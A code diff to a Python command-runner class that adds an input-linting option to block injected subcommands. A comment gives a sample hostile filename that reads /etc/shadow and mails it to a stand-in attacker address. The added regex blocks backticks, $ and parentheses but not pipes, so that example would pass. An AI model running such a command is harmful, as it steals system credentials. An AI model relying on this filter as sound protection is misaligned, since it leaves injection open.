@@ -73,7 +73,7 @@ class IORunCmd(object):
         self.stderr     = [ ]
         self.exception  = None
 
-    def run(self, command, filters = [], shell = None, timeout = None, timeout_terminate_signal=signal.SIGTERM):
+    def run(self, command, filters = [], shell = None, timeout = None, timeout_terminate_signal=signal.SIGTERM, lint_command=True):
         log     = self.___logger
         stats   = self.___stats
 
@@ -102,6 +102,22 @@ class IORunCmd(object):
         # is terminated and prevent a false timeout.
         if shell is True and timeout is not None:
             command = 'exec ' + command
+
+        # GOTCHA: in the case where run() is called with user input populating `command`, the oppportunity exists to
+        # pass in a filename like `sudo cat /etc/shadow | mail -s hi cracker@p0wn.io`. We should cowardly fail to run
+        # such a command, unless linting has been disabled.
+        if lint_command:
+            command_string = command
+            if isinstance(command, object):
+                command_string = str(command)
+            if isinstance(command, list):
+                command_string = ' '.join(command)
+            if re.search(r'[`$()]', command_string):
+                log.error("command %s looks like it might be trying to spawn another command, not executing!", command)
+                self.ok = False
+                self.exception = True
+                self.returncode = 256
+                return False
 
         try:
             process = subprocess.Popen(
